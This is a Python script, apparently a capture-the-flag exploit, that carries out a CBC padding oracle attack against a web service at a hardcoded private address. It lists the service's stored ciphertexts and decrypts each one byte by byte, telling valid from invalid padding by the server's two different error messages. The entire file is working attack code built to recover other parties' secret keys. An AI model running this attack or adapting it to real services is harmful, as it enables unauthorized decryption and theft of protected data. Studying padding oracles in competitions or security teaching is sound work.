import requests
import binascii

hx=binascii.hexlify
ux=binascii.unhexlify

def put(server, data, iv):
	response = requests.get('http://%s/put'%server,params=dict(mes=data))
	crypt = dict(zip(['id','sign','enc'],response.text.split(' ')))
	crypt.update(blocks=deblock(ux(crypt['enc'])),data=data)
	crypt.update(iv=iv,raw=ux(crypt['enc']))
	return crypt

def get(server, crypt):
	params=dict([(key,crypt[key]) for key in ['id','enc','sign']])
	return requests.get('http://%s/get'%server,params=params).text

def get_list(server, iv, sign='-'):
	results = requests.get('http://%s/list'%server).text
	results = [result.split(' ') for result in results.split('\n')]
	results = [dict(zip(['id','enc'],result)) for result in results]
	for result in results: result.update(blocks=deblock(ux(result['enc'])),iv=iv,sign=sign)
	return results

def check(server, data):
	crypt = put(server, data)
	carbon = get(server, crypt)
	return data == carbon

def deblock(data, blocklen=16):
	return [data[i:i+blocklen] for i in xrange(0,len(data),blocklen)]

def reblock(blocks):
	return ''.join(blocks)

def padding_oracle(server, crypt, enc=None):
	if enc is None: enc = crypt['enc']
	test = get(server,dict(crypt,enc=enc))
	if test == 'Exception!\nInvalid padding': return False
	if test == 'Exception!\nInvalid checksum provided': return True
	if 'data' in crypt and test == crypt['data']: return True # debugging
	raise Exception('unexpected reply "%s" from request %s'%(test,dict(crypt,enc=enc)))

def decrypt_blocks(server, crypt, blocklen=16, debug=True):
	decrypt = ''
	for block in xrange(len(crypt['blocks'])):
		decrypt = decrypt_block(server, crypt, block,blocklen=blocklen) + decrypt
		if debug: print (len(crypt['blocks'])-block-1)*blocklen*'?'+decrypt[:-ord(decrypt[-1])]+' (%d-bytes padding)'%ord(decrypt[-1])
	return decrypt[:-ord(decrypt[-1])]

def decrypt_block(server, crypt, block, blocklen=16, debug=False):
	offset = 0
	decrypts = []
	for index in xrange(blocklen):
		offset,decrypt = decrypt_block_index(server, crypt, index, block, offset)
		decrypts.insert(0,decrypt)
		if debug: print index,decrypts
	return ''.join(decrypts)

def decrypt_block_index(server, crypt, index, block, known_offset):
	if block < len(crypt['blocks'])-1:
		encrypted = ord(crypt['blocks'][-block-2][-index-1])
	else:
		encrypted = ord(crypt['iv'][-index-1])
	pre_blocks = hx(reblock(crypt['blocks'][:-(block+2)]))
	post_blocks = hx(reblock(crypt['blocks'][-(block+1):][:1])) # limit to 1 block for padding oracle

	padding = index+1
	padded_offset = known_offset
	for i in xrange(index): padded_offset ^= padding*256**i
	for target in xrange(256):
		offset = target*256**index + padded_offset
		blocks = '%s%032x%s'%(pre_blocks,offset,post_blocks)
		if not padding_oracle(server, crypt, enc=blocks): continue
		if index == 0: # verify '\x01' (ie, not '\x02\x02') by incrementing next byte
			blocks = '%s%032x%s'%(pre_blocks,offset+256,post_blocks)
			if not padding_oracle(server, crypt, enc=blocks): continue
		offset = (target^padding)*256**index + known_offset
		decrypt = padding ^ target ^ encrypted
		return offset,chr(decrypt)
	raise Exception('failed to decrypt block index (%s,%s,%s,%s)'%(crypt,index,block,known_offset))

def get_all_blocks(server,iv='S3cr3t_IV TRY_ME',solved=[],debug=True):
	results = filter(lambda r:r['id'] not in solved,get_list(server,iv))
	keys = []
	print 'found',len(results),'new keys','(%s)'%', '.join([r['id'] for r in results])
	for result in results:
		data=dict(id=result['id'],data=decrypt_blocks(server, result, debug=debug))
		keys.append(data)
		if debug: print '\n',data['id'],data['data']
	return keys

if __name__ == '__main__':
	import sys
	server='10.60.1.2:4369'
	data = sys.argv[1] if len(sys.argv)>1 else 'a'*90
	crypt=put(server,data,iv='S3cr3t_IV TRY_ME')
	decrypt_blocks(server,crypt,debug=True)
